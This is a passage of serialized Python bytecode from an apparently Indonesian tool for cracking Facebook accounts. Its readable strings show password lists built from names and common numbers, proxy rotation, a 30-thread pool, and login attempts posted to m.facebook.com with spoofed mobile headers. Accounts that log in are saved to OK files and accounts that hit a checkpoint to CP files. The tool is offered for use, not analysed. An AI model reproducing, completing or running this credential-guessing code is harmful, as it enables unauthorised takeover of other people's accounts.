)\x02r\xd4\x00\x00\x00r\x18\x00\x00\x00)\x02r\xd3\x00\x00\x00r!\x00\x00\x00r\xad\x00\x00\x00)\x18r\x05\x00\x00\x00r|\x00\x00\x00r}\x00\x00\x00r~\x00\x00\x00r\x7f\x00\x00\x00r\x81\x00\x00\x00rj\x00\x00\x00r\x1c\x00\x00\x00r\xa6\x00\x00\x00\xda\x03id2rG\x00\x00\x00r\xd1\x00\x00\x00\xda\x03id4\xda\x06insert\xda\x06randomr\x06\x00\x00\x00r\xc7\x00\x00\x00r_\x00\x00\x00r\xc8\x00\x00\x00r\x80\x00\x00\x00r$\x00\x00\x00\xda\x14crack_public_pilihan\xda\x17crack_followers_pilihanZ\x0bpilih_crack)\x06r\x8a\x00\x00\x00Z\x07GlukTzyZ\x05bacotZ\x04kontZ\x02xxZ\x07pilihanrQ\x00\x00\x00rQ\x00\x00\x00rR\x00\x00\x00r\xc8\x00\x00\x00\xe6\x01\x00\x00sB\x00\x00\x00\x00\x01\x08\x01\x18\x01\x12\x01\x10\x01\x08\x01\x08\x01\x0c\x01\x08\x01\x0e\x01\x08\x01\x08\x01\x0e\x01\x08\x01\x10\x01\n\x01\x08\x01\x10\x01\x0e\x01\x08\x01\x10\x01\x10\x02\x0c\x01\x06\x01\x08\x01:\x01\x12\x01*\x01\n\x01\x08\x01\n\x01\x08\x02\x0e\x01r\xc8\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x13\x00\x00\x00C\x00\x00\x00s\xa6\x04\x00\x00t\x00d\x01\x83\x01\x01\x00d\x02t\x01\x9b\x00d\x03t\x02\x9b\x00d\x04t\x01\x9b\x00d\x05t\x01\x9b\x00d\x06t\x03\x9b\x00d\x07t\x01\x9b\x00d\x05t\x01\x9b\x00d\x08t\x04\x9b\x00d\tt\x01\x9b\x00d\n\x9d\x13}\x00t\x05t\x06|\x00t\x07\x9b\x00d\x0b\x8d\x02\x83\x01\x01\x00t\x08t\td\x0c\x17\x00t\n\x17\x00\x83\x01}\x01|\x01d\rv\x00rzt\x0b\xa0\x0cd\x0e\xa1\x01\x01\x00n2|\x01d\x0fv\x00r\x8et\x0b\xa0\x0cd\x10\xa1\x01\x01\x00n\x1e|\x01d\x11v\x00r\xa2t\x0b\xa0\x0cd\x12\xa1\x01\x01\x00n\nt\x0b\xa0\x0cd\x0e\xa1\x01\x01\x00t\x00d\x01\x83\x01\x01\x00t\x08t\td\x13\x17\x00t\n\x17\x00d\x14\x17\x00t\r\x17\x00d\x15\x17\x00t\x0e\x17\x00d\x16\x17\x00t\r\x17\x00d\x17\x17\x00t\n\x17\x00d\x18\x17\x00\x83\x01}\x02|\x02d\x19v\x00\x90\x01rVt\x0f\xa0\x0cd\x1a\xa1\x01\x01\x00d\x02t\x01\x9b\x00d\x1bt\x02\x9b\x00d\x1c\x9d\x05}\x00t\x05t\x06|\x00t\x07\x9b\x00d\x0b\x8d\x02\x83\x01\x01\x00t\x08t\td\x1d\x17\x00t\n\x17\x00d\x18\x17\x00\x83\x01}\x03|\x03\xa0\x10d\x1e\xa1\x01}\x04|\x04D\x00]\x10}\x05t\x11\xa0\x0c|\x05\xa1\x01\x01\x00\x90\x01qBn |\x02d\x1fv\x00\x90\x01rlt\x0f\xa0\x0cd \xa1\x01\x01\x00n\nt\x0f\xa0\x0cd \xa1\x01\x01\x00t\x08t\td!\x17\x00t\n\x17\x00d\x14\x17\x00t\r\x17\x00d\x15\x17\x00t\x0e\x17\x00d\x16\x17\x00t\r\x17\x00d\x17\x17\x00t\n\x17\x00d\x18\x17\x00\x83\x01}\x06|\x06d"v\x00\x90\x01r\xbct\x12\x83\x00\x01\x00n\x12|\x06d#v\x00\x90\x01r\xc8n\x06t\x12\x83\x00\x01\x00t\x08t\td$\x17\x00t\n\x17\x00d\x14\x17\x00t\r\x17\x00d\x15\x17\x00t\x0e\x17\x00d\x16\x17\x00t\r\x17\x00d\x17\x17\x00t\n\x17\x00d\x18\x17\x00\x83\x01}\x07|\x07d\x19v\x00\x90\x02rpt\x13\xa0\x0cd\x1a\xa1\x01\x01\x00d\x02t\x01\x9b\x00d%t\x02\x9b\x00d\x1c\x9d\x05}\x00t\x05t\x06|\x00t\x07\x9b\x00d\x0b\x8d\x02\x83\x01\x01\x00t\x08t\td&\x17\x00t\n\x17\x00d\x18\x17\x00\x83\x01}\x03|\x03\xa0\x10d\x1e\xa1\x01}\x04|\x04D\x00]\x10}\x05t\x14\xa0\x0c|\x05\xa1\x01\x01\x00\x90\x02q\\n |\x07d\x1fv\x00\x90\x02r\x86t\x13\xa0\x0cd \xa1\x01\x01\x00n\nt\x13\xa0\x0cd \xa1\x01\x01\x00t\x08t\td\'\x17\x00t\n\x17\x00d\x14\x17\x00t\r\x17\x00d\x15\x17\x00t\x0e\x17\x00d\x16\x17\x00t\r\x17\x00d\x17\x17\x00t\n\x17\x00d\x18\x17\x00\x83\x01}\x08|\x08d(v\x00\x90\x04r\x92t\x15d)d*\x8d\x01\x90\x01\x8f\x00}\td\x02t\x01\x9b\x00d+t\x02\x9b\x00d\x1c\x9d\x05}\x00t\x05t\x06|\x00t\x07\x9b\x00d\x0b\x8d\x02\x83\x01\x01\x00t\x08t\td,t\rt\nf\x02\x16\x00\x17\x00\x83\x01}\nt\x16|\n\x83\x01d-k\x01\x90\x03r6t\x17d.t\t\x17\x00d/t\x0e\x16\x00\x17\x00\x83\x01\x01\x00d\x02t\x01\x9b\x00d0t\x02\x9b\x00|\n\x9b\x00\x9d\x05}\x00t\x05t\x06|\x00t\x07\x9b\x00d\x0b\x8d\x02\x83\x01\x01\x00t\x00d\x01\x83\x01\x01\x00t\x01\x9b\x00d1t\x02\x9b\x00d2t\x18\x9b\x00d3t\x01\x9b\x00d4t\x03\x9b\x00d5t\x18\x9b\x00d3t\x01\x9b\x00d6\x9d\x0e}\x00t\x05t\x06|\x00t\x07\x9b\x00d\x0b\x8d\x02\x83\x01\x01\x00t\x00d\x01\x83\x01\x01\x00t\x19D\x00]\x1a}\x0b|\t\xa0\x1at\x1b|\x0b|\n\xa0\x10d\x1e\xa1\x01\xa1\x03\x01\x00\x90\x03q\xb0W\x00d\x00\x04\x00\x04\x00\x83\x03\x01\x00n\x121\x00\x90\x03s\xe20\x00\x01\x00\x01\x00\x01\x00Y\x00\x01\x00t\x00d\x01\x83\x01\x01\x00t\x16t\x1c\x83\x01d7k\x03\x90\x04s\x10t\x16t\x1d\x83\x01d7k\x03\x90\x04rbd\x02t\x01\x9b\x00d8t\x03\x9b\x00t\x16t\x1d\x83\x01\x9b\x00d9t\x01\x9b\x00d:t\x02\x9b\x00t\x16t\x1c\x83\x01\x9b\x00\x9d\n}\x00t\x05t\x06|\x00t\x07\x9b\x00d\x0b\x8d\x02\x83\x01\x01\x00t\x08t\td;\x17\x00\x83\x01\x01\x00t\x1e\x83\x00\x01\x00n.t\x01\x9b\x00d<\x9d\x02}\x00t\x05t\x06|\x00t\x07\x9b\x00d\x0b\x8d\x02\x83\x01\x01\x00t\x08t\td;\x17\x00\x83\x01\x01\x00t\x1e\x83\x00\x01\x00n\x10|\x08d#v\x00\x90\x04r\xa2t\x1f\x83\x00\x01\x00d\x00S\x00\xa9=NrR\x00\x00\x00rt\x00\x00\x00z\x15[01] methode mobile (z\x0eslowed crackedz\x04)\n\t\tz\x15[02] methode mbasic (z\x0cfast crackedz\x14[03] methode free  (z\x10not recommended \xfa\x01)rs\x00\x00\x00r\xa8\x00\x00\x00)\x03r\x08\x00\x00\x00r\x90\x00\x00\x00rO\x00\x00\x00\xda\x06mobile)\x03r\t\x00\x00\x00r\x92\x00\x00\x00\xda\x01b\xda\x06mbasic)\x03r\n\x00\x00\x00r\xd2\x00\x00\x00r\xb3\x00\x00\x00\xda\x04freez& ingin menambahkan password tambahan (r\xa9\x00\x00\x00r?\x00\x00\x00r\xaa\x00\x00\x00z\x05) ? :r:\x00\x00\x00)\x05r\xa9\x00\x00\x00r-\x00\x00\x00\xda\x03yes\xda\x02YaZ\x03Yesr\xab\x00\x00\x00z\x1bcontoh password tambahan : z\x16anjing,ngentot,sayang z\x14 password tambahan :\xfa\x01,)\x05r\xaa\x00\x00\x00r(\x00\x00\x00\xda\x05Tidakr\xac\x00\x00\x00\xda\x02nor\xe5\x00\x00\x00z# ingin menambahkan proxy tambahan ()\x04r\xa9\x00\x00\x00r-\x00\x00\x00r\xe1\x00\x00\x00r\xe2\x00\x00\x00)\x04r\xaa\x00\x00\x00r(\x00\x00\x00r\xac\x00\x00\x00r\xe4\x00\x00\x00z+ ingin menambahkan password belakang nama (z\x1bcontoh password belakang : z\x19 password belakang nama :z  ingin memakai password manual ()\x04r\xa9\x00\x00\x00r-\x00\x00\x00r\xab\x00\x00\x00r\xe1\x00\x00\x00\xe9\x1e\x00\x00\x00\xa9\x01Z\x0bmax_workersz\x12contoh password : z\x15%s list password :%s r3\x00\x00\x00rB\x00\x00\x00z\x1b%s password minimal 6 angkaz\x14list password crack \xfa\x1chasil crack ok tersimpan di \xfa\x03OK/\xfa\x05.txt\n\xfa\x1chasil crack cp tersimpan di \xfa\x03CP/\xfalkalo tidak ada hasil coba mode pesawat 5 detik trus hidupin lagi data nya\nmoga dapet banyak yakk result nya r\x01\x00\x00\x00\xfa\x0ehasil cp mu : r\xa7\x00\x00\x00\xfa\x0ehasil ok mu : \xfa\t kembali \xfajkok gada hasil? makanya ganteng klo gk ganteng kemungkinan kecil dapet result, intinya harus ganteng ajg:v) r\x05\x00\x00\x00r|\x00\x00\x00r\x80\x00\x00\x00r\xaf\x00\x00\x00r\x94\x00\x00\x00r}\x00\x00\x00r~\x00\x00\x00r\x7f\x00\x00\x00r\x81\x00\x00\x00rj\x00\x00\x00r\x1c\x00\x00\x00\xda\x06metoderG\x00\x00\x00r$\x00\x00\x00r!\x00\x00\x00\xda\x0bpw_tambahan\xda\x05split\xda\x05pw_nirc\x00\x00\x00\xda\x0bpw_belakang\xda\x05pw_lu\xda\x05treadr\xc7\x00\x00\x00r\x87\x00\x00\x00r\xb0\x00\x00\x00r\xa6\x00\x00\x00\xda\x06submitr\xdd\x00\x00\x00\xda\x02ok\xda\x02cpr\x82\x00\x00\x00\xda\x07passwer\xa9\x0cr\x8a\x00\x00\x00r\xca\x00\x00\x00Z\x0cpw_tambahaniZ\npw_nya_cokZ\x05pw_gwZ\x03cpwZ\x0bnanya_proxyZ\x0bpw_tambahaiZ\x06pilpasZ\x08HikmatXFZ\x08listpass\xda\x04userrQ\x00\x00\x00rQ\x00\x00\x00rR\x00\x00\x00r\xd9\x00\x00\x00\x0b\x02\x00\x00s\x8c\x00\x00\x00\x00\x01\x08\x01<\x01\x12\x01\x10\x01\x08\x01\x0c\x01\x08\x01\x0c\x01\x08\x01\x0c\x02\n\x01\x08\x014\x01\n\x01\n\x01\x12\x01\x12\x01\x14\x01\n\x01\x08\x01\x10\x01\n\x01\x0c\x02\n\x014\x01\n\x01\x08\x01\n\x01\x02\x02\x06\x014\x01\n\x01\n\x01\x12\x01\x12\x01\x14\x01\n\x01\x08\x01\x10\x01\n\x01\x0c\x02\n\x014\x01\n\x01\x0e\x01\x12\x01\x12\x01\x14\x01\x0e\x01\x14\x01\x14\x01\x12\x01\x08\x01.\x01\x12\x01\x08\x01\x08\x018\x01\x08\x01\x1c\x01,\x01\x12\x01\x0c\x01\x08\x02\n\x01\x12\x01\x0c\x01\x08\x01\n\x01r\xd9\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\t\x00\x00\x00\x0e\x00\x00\x00C\x00\x00\x00s\xb8\x02\x00\x00t\x00d\x01\x83\x01\x01\x00t\x01\x9b\x00d\x02t\x02\x9b\x00d\x03t\x03\x9b\x00d\x04t\x01\x9b\x00d\x05t\x04\x9b\x00d\x06t\x03\x9b\x00d\x04t\x01\x9b\x00d\x07\x9d\x0e}\x00t\x05t\x06|\x00t\x07\x9b\x00d\x08\x8d\x02\x83\x01\x01\x00t\x00d\x01\x83\x01\x01\x00t\x08d\td\n\x8d\x01\x90\x01\x8f\xa2}\x01t\tD\x00\x90\x01]\x8a}\x02|\x02\xa0\nd\x0b\xa1\x01d\x0c\x19\x00|\x02\xa0\nd\x0b\xa1\x01d\r\x19\x00\xa0\x0b\xa1\x00\x02\x00}\x03}\x04|\x04\xa0\nd\x0e\xa1\x01d\x0c\x19\x00}\x05g\x00}\x06t\x0c|\x04\x83\x01d\x0fk\x00r\xf0t\x0c|\x05\x83\x01d\x10k\x00r\xb6n8|\x06\xa0\r|\x05d\x11\x17\x00\xa1\x01\x01\x00|\x06\xa0\r|\x05d\x12\x17\x00\xa1\x01\x01\x00|\x06\xa0\r|\x05d\x13\x17\x00\xa1\x01\x01\x00|\x06\xa0\r|\x05d\x14\x17\x00\xa1\x01\x01\x00n\\t\x0c|\x05\x83\x01d\x10k\x00\x90\x01r\n|\x06\xa0\r|\x04\xa1\x01\x01\x00nB|\x06\xa0\r|\x04\xa1\x01\x01\x00|\x06\xa0\r|\x05d\x11\x17\x00\xa1\x01\x01\x00|\x06\xa0\r|\x05d\x12\x17\x00\xa1\x01\x01\x00|\x06\xa0\r|\x05d\x13\x17\x00\xa1\x01\x01\x00|\x06\xa0\r|\x05d\x14\x17\x00\xa1\x01\x01\x00d\x15t\x0ev\x00\x90\x01rlt\x0fD\x00]\x10}\x07|\x06\xa0\r|\x07\xa1\x01\x01\x00\x90\x01qZd\x15t\x10v\x00\x90\x01r\x92t\x11D\x00]\x14}\x08|\x06\xa0\r|\x05|\x08\x17\x00\xa1\x01\x01\x00\x90\x01qzn\x00d\x16t\x12v\x00\x90\x01r\xac|\x01\xa0\x13t\x14|\x03|\x06\xa1\x03\x01\x00qbd\x17t\x12v\x00\x90\x01r\xc6|\x01\xa0\x13t\x15|\x03|\x06\xa1\x03\x01\x00qbd\x18t\x12v\x00\x90\x01r\xe0|\x01\xa0\x13t\x16|\x03|\x06\xa1\x03\x01\x00qb|\x01\xa0\x13t\x14|\x03|\x06\xa1\x03\x01\x00qbW\x00d\x00\x04\x00\x04\x00\x83\x03\x01\x00n\x121\x00\x90\x02s\x060\x00\x01\x00\x01\x00\x01\x00Y\x00\x01\x00t\x00d\x01\x83\x01\x01\x00t\x0ct\x17\x83\x01d\x0ck\x03\x90\x02s4t\x0ct\x18\x83\x01d\x0ck\x03\x90\x02r\x86d\x19t\x01\x9b\x00d\x1at\x04\x9b\x00t\x0ct\x18\x83\x01\x9b\x00d\x1bt\x01\x9b\x00d\x1ct\x02\x9b\x00t\x0ct\x17\x83\x01\x9b\x00\x9d\n}\x00t\x05t\x06|\x00t\x07\x9b\x00d\x08\x8d\x02\x83\x01\x01\x00t\x19t\x1ad\x1d\x17\x00\x83\x01\x01\x00t\x1b\x83\x00\x01\x00n.t\x01\x9b\x00d\x1e\x9d\x02}\x00t\x05t\x06|\x00t\x07\x9b\x00d\x08\x8d\x02\x83\x01\x01\x00t\x19t\x1ad\x1d\x17\x00\x83\x01\x01\x00t\x1b\x83\x00\x01\x00d\x00S\x00\xa9\x1fNrR\x00\x00\x00r\xe8\x00\x00\x00r\xe9\x00\x00\x00r\xea\x00\x00\x00r\xeb\x00\x00\x00r\xec\x00\x00\x00r\xed\x00\x00\x00rs\x00\x00\x00r\xe6\x00\x00\x00r\xe7\x00\x00\x00r\xbf\x00\x00\x00r\x01\x00\x00\x00r4\x00\x00\x00r:\x00\x00\x00\xe9\x06\x00\x00\x00\xe9\x03\x00\x00\x00Z\x03123Z\x0512345Z\x041234Z\x06123456r\xab\x00\x00\x00r\xdd\x00\x00\x00r\xdf\x00\x00\x00r\xe0\x00\x00\x00rt\x00\x00\x00r\xee\x00\x00\x00r\xa7\x00\x00\x00r\xef\x00\x00\x00r\xf0\x00\x00\x00r\xf1\x00\x00\x00)\x1cr\x05\x00\x00\x00r|\x00\x00\x00r\x80\x00\x00\x00r\xb0\x00\x00\x00r\xaf\x00\x00\x00r}\x00\x00\x00r~\x00\x00\x00r\x7f\x00\x00\x00r\xf8\x00\x00\x00r\xd5\x00\x00\x00r\xf4\x00\x00\x00\xda\x05lowerr\xc7\x00\x00\x00rG\x00\x00\x00r\xf3\x00\x00\x00r\xf5\x00\x00\x00r\xf6\x00\x00\x00r\xf7\x00\x00\x00r\xf2\x00\x00\x00r\xf9\x00\x00\x00r\xdd\x00\x00\x00r\xdf\x00\x00\x00r\xe0\x00\x00\x00r\xfa\x00\x00\x00r\xfb\x00\x00\x00r\x81\x00\x00\x00rj\x00\x00\x00r\x82\x00\x00\x00\xa9\tr\x8a\x00\x00\x00r\xb2\x00\x00\x00Z\x06koncol\xda\x03uizZ\x03mmkZ\x04prot\xda\x03pwrZ\x04xnxrZ\x04asoerQ\x00\x00\x00rQ\x00\x00\x00rR\x00\x00\x00r\xfc\x00\x00\x00X\x02\x00\x00s\\\x00\x00\x00\x00\x01\x08\x01.\x01\x12\x01\x08\x01\x0e\x01\n\x01"\x01\x0e\x01\x04\x01\x0c\x01\x0c\x01\x02\x02\x0e\x01\x0e\x01\x0e\x01\x10\x02\x0e\x01\x0c\x02\n\x01\x0e\x01\x0e\x01\x0e\x01\x0e\x01\n\x01\x08\x01\x0e\x01\n\x01\x08\x01\x14\x02\n\x01\x10\x01\n\x01\x10\x01\n\x01\x10\x020\x01\x08\x01\x1c\x01,\x01\x12\x01\x0c\x01\x08\x02\n\x01\x12\x01\x0c\x01r\xfc\x00\x00\x00c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x13\x00\x00\x00C\x00\x00\x00s\x84\x02\x00\x00d\x01g\x01}\x02t\x00\xa0\x01t\x02\xa1\x01}\x02t\x03\xa0\x04\xa1\x00}\x03t\x05j\x06\xa0\x07d\x02t\x08t\tt\n\x83\x01t\x0bt\x0ct\tt\r\x83\x01t\x0et\tt\x0f\x83\x01f\x07\x16\x00\xa1\x01\x01\x00t\x05j\x06\xa0\x10\xa1\x00\x01\x00|\x01D\x00\x90\x02]$}\x04|\x04\xa0\x11\xa1\x00}\x04\x90\x01z\xf2t\x12d\x03d\x04\x83\x02\xa0\x13\xa1\x00\xa0\x14\xa1\x00}\x05t\x00\xa0\x01|\x05\xa1\x01}\x06d\x05d\x06|\x06\x17\x00i\x01}\x07|\x03j\x15\xa0\x16d\x07d\x08d\td\n|\x02d\x0bd\x0cd\rd\x0ed\x0fd\x10\x9c\n\xa1\x01\x01\x00|\x03\xa0\x17d\x11|\x00\x17\x00d\x12\x17\x00\xa1\x01}\x08t\x18\xa0\x19d\x13t\x1a|\x08j\x1b\x83\x01\xa1\x02\xa0\x1cd\x14\xa1\x01t\x18\xa0\x19d\x15t\x1a|\x08j\x1b\x83\x01\xa1\x02\xa0\x1cd\x14\xa1\x01|\x00d\x16d\x17|\x04d\x18\x9c\x06}\td\x19\xa0\x1dd\x1ad\x1b\x84\x00|\x08j\x1e\xa0\x1f\xa1\x00\xa0 \xa1\x00D\x00\x83\x01\xa1\x01}\n|\nd\x1c7\x00}\nd\x07d\x08d\x1dd\td\x1ed\nd\x1fd |\x02d\x0bd!d\x0cd\rd\x0ed\x11|\x00\x17\x00d\x12\x17\x00d"d\x0fd#\x9c\x11}\x0b|\x03j!d$|\td%|\ni\x01|\x0bd&|\x07d\'\x8d\x06}\x0cd(|\x03j\x1e\xa0\x1f\xa1\x00\xa0"\xa1\x00v\x00\x90\x01r\xbct#d)t\x0e|\x00|\x04f\x03\x16\x00\x83\x01\x01\x00t\x12d*t$\x17\x00d+\x83\x02\xa0\x07|\x00d,\x17\x00|\x04\x17\x00d,\x17\x00d-\x17\x00\xa1\x01\x01\x00W\x00\x01\x00\x90\x02qxn\x94d.|\x03j\x1e\xa0\x1f\xa1\x00\xa0"\xa1\x00v\x00\x90\x02rL|\x0cj\x1e\xa0\x1f\xa1\x00}\rd\x19\xa0\x1dd/d\x1b\x84\x00|\x03j\x1e\xa0\x1f\xa1\x00\xa0 \xa1\x00D\x00\x83\x01\xa1\x01}\x0et#d)t\x0c|\x00|\x04f\x03\x16\x00\x83\x01\x01\x00t#d0t\x0c|\x0ef\x02\x16\x00\x83\x01\x01\x00t\x12d1t%\x17\x00d+\x83\x02\xa0\x07|\x00d,\x17\x00|\x04\x17\x00d,\x17\x00|\x0e\x17\x00d-\x17\x00\xa1\x01\x01\x00W\x00\x01\x00\x90\x02qxn\x04W\x00qPW\x00qP\x04\x00t\x03j&j\'\x90\x02yt\x01\x00\x01\x00\x01\x00t(\xa0)d2\xa1\x01\x01\x00Y\x00qP0\x00qPt\x0bd\x147\x00a\x0bd\x00S\x00)3N\xfa\x86Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36\xf5(\x00\x00\x00\r \t\t%s\xe2\x80\xa2 cracked %s/%s %sok:%s %scp:%s r`\x00\x00\x00r@\x00\x00\x00\xda\x04http\xfa\tsocks5://rT\x00\x00\x00r\x97\x00\x00\x00\xfa\x02?1r\x08\x00\x00\x00\xfa\x87text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\xfa\x0bsame-origin\xda\x04cors\xda\x05emptyr\x96\x00\x00\x00\xa9\n\xda\x04Hostr\x9c\x00\x00\x00\xfa\x10sec-ch-ua-mobiler\x9a\x00\x00\x00rU\x00\x00\x00r\x9d\x00\x00\x00\xfa\x0esec-fetch-site\xfa\x0esec-fetch-mode\xfa\x0esec-fetch-destr\x9b\x00\x00\x00\xfa8https://m.facebook.com/login/device-based/password/?uid=\xe1h\x04\x00\x00&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr\xfa\x18name="lsd" value="(.*?)"r4\x00\x00\x00\xfa\x1cname="jazoest" value="(.*?)"\xe1"\x02\x00\x00https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified\xda\x0clogin_no_pin\xa9\x06Z\x03lsdZ\x07jazoestr\xc6\x00\x00\x00\xda\x04nextZ\x04flowZ\x04pass\xfa\x01;c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00S\x00\x00\x00s\x1c\x00\x00\x00g\x00|\x00]\x14\\\x02}\x01}\x02d\x00|\x01|\x02f\x02\x16\x00\x91\x02q\x04S\x00\xa9\x01z\x05%s=%srQ\x00\x00\x00\xa9\x03\xda\x02.0\xda\x03key\xda\x05valuerQ\x00\x00\x00rQ\x00\x00\x00rR\x00\x00\x00\xda\n<listcomp>\x9e\x02\x00\x00\xf3\x00\x00\x00\x00z\x1amobile.<locals>.<listcomp>\xfa  m_pixel_ratio=2.625; wd=412x756\xfa(" Not A;Brand";v="99", "Chromium";v="98"\xfa\t"Android"\xfa\x16https://m.facebook.com\xfa!application/x-www-form-urlencoded\xda\x0eXMLHttpRequest\xfa\x11gzip, deflate, br\xa9\x11r\x10\x01\x00\x00r\x9c\x00\x00\x00z\tsec-ch-uar\x11\x01\x00\x00z\x12sec-ch-ua-platformr\x9a\x00\x00\x00r\x99\x00\x00\x00r\x9e\x00\x00\x00rU\x00\x00\x00r\x9d\x00\x00\x00z\x10x-requested-withr\x12\x01\x00\x00r\x13\x01\x00\x00r\x14\x01\x00\x00r\x98\x00\x00\x00z\x0faccept-encodingr\x9b\x00\x00\x00\xfaQhttps://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_IDrm\x00\x00\x00F\xa9\x05r\xbe\x00\x00\x00rq\x00\x00\x00r\x9f\x00\x00\x00Z\x0fallow_redirectsZ\x07proxies\xda\ncheckpoint\xfa\x0f\r %s*--> %s|%s r\xec\x00\x00\x00rO\x00\x00\x00r\xbf\x00\x00\x00rB\x00\x00\x00\xda\x06c_userc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00S\x00\x00\x00s\x1c\x00\x00\x00g\x00|\x00]\x14\\\x02}\x01}\x02d\x00|\x01|\x02f\x02\x16\x00\x91\x02q\x04S\x00r\x1e\x01\x00\x00rQ\x00\x00\x00r\x1f\x01\x00\x00rQ\x00\x00\x00rQ\x00\x00\x00rR\x00\x00\x00r#\x01\x00\x00\xa8\x02\x00\x00r$\x01\x00\x00\xfa\x0c\r %s*--> %s r\xe9\x00\x00\x00\xe9\x1f\x00\x00\x00\xa9*r\xd8\x00\x00\x00\xda\x06choicerF\x00\x00\x00rH\x00\x00\x00ry\x00\x00\x00rZ\x00\x00\x00r[\x00\x00\x00rM\x00\x00\x00r$\x00\x00\x00r\xc7\x00\x00\x00r\xd5\x00\x00\x00\xda\x04loopr\x1c\x00\x00\x00r\xfa\x00\x00\x00r\x1f\x00\x00\x00r\xfb\x00\x00\x00r\\\x00\x00\x00r\x02\x01\x00\x00rC\x00\x00\x00rD\x00\x00\x00rE\x00\x00\x00r\x9f\x00\x00\x00\xda\x06updaterI\x00\x00\x00rK\x00\x00\x00r\xa3\x00\x00\x00rL\x00\x00\x00rJ\x00\x00\x00r\xa4\x00\x00\x00\xda\x04joinrq\x00\x00\x00\xda\x08get_dict\xda\x05items\xda\x04post\xda\x04keysr\x05\x00\x00\x00\xda\x03cpz\xda\x03okzr\x85\x00\x00\x00r\x86\x00\x00\x00\xda\x04timer\x07\x00\x00\x00\xa9\x0fr\x04\x01\x00\x00r\x05\x01\x00\x00rN\x00\x00\x00r\xc9\x00\x00\x00Z\x02pwZ\x06proxffZ\x05cuukkZ\x05proxs\xda\x01pZ\x05dataaZ\x04kokiZ\x05headeZ\x02por\xcb\x00\x00\x00Z\x04kukirQ\x00\x00\x00rQ\x00\x00\x00rR\x00\x00\x00r\xdd\x00\x00\x00\x8e\x02\x00\x00s@\x00\x00\x00\x00\x02\x06\x01\n\x01\x08\x014\x01\n\x01\x08\x01\x04\x01\x12\x01\n\x01\x0c\x02"\x01\x12\x01:\x01\x1e\x01\x08\x010\x01\x1a\x01\x14\x01\x12\x01$\x01\n\x01\x14\x01\n\x01\x1e\x01\x12\x01\x10\x01(\x01\n\x03\x08\x01\x12\x01\x12\x01r\xdd\x00\x00\x00c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x13\x00\x00\x00C\x00\x00\x00s\x84\x02\x00\x00d\x01g\x01}\x02t\x00\xa0\x01t\x02\xa1\x01}\x02t\x03\xa0\x04\xa1\x00}\x03t\x05j\x06\xa0\x07d\x02t\x08t\tt\n\x83\x01t\x0bt\x0ct\tt\r\x83\x01t\x0et\tt\x0f\x83\x01f\x07\x16\x00\xa1\x01\x01\x00t\x05j\x06\xa0\x10\xa1\x00\x01\x00|\x01D\x00\x90\x02]$}\x04|\x04\xa0\x11\xa1\x00}\x04\x90\x01z\xf2t\x12d\x03d\x04\x83\x02\xa0\x13\xa1\x00\xa0\x14\xa1\x00}\x05t\x00\xa0\x01|\x05\xa1\x01}\x06d\x05d\x06|\x06\x17\x00i\x01}\x07|\x03j\x15\xa0\x16d\x07d\x08d\td\n|\x02d\x0bd\x0cd\rd\x0ed\x0fd\x10\x9c\n\xa1\x01\x01\x00|\x03\xa0\x17d\x11|\x00\x17\x00d\x12\x17\x00\xa1\x01}\x08t\x18\xa0\x19d\x13t\x1a|\x08j\x1b\x83\x01\xa1\x02\xa0\x1cd\x14\xa1\x01t\x18\xa0\x19d\x15t\x1a|\x08j\x1b\x83\x01\xa1\x02\xa0\x1cd\x14\xa1\x01|\x00d\x16d\x17|\x04d\x18\x9c\x06}\td\x19\xa0\x1dd\x1ad\x1b\x84\x00|\x08j\x1e\xa0\x1f\xa1\x00\xa0 \xa1\x00D\x00\x83\x01\xa1\x01}\n|\nd\x1c7\x00}\nd\x07d\x08d\x1dd\td\x1ed\nd\x1fd 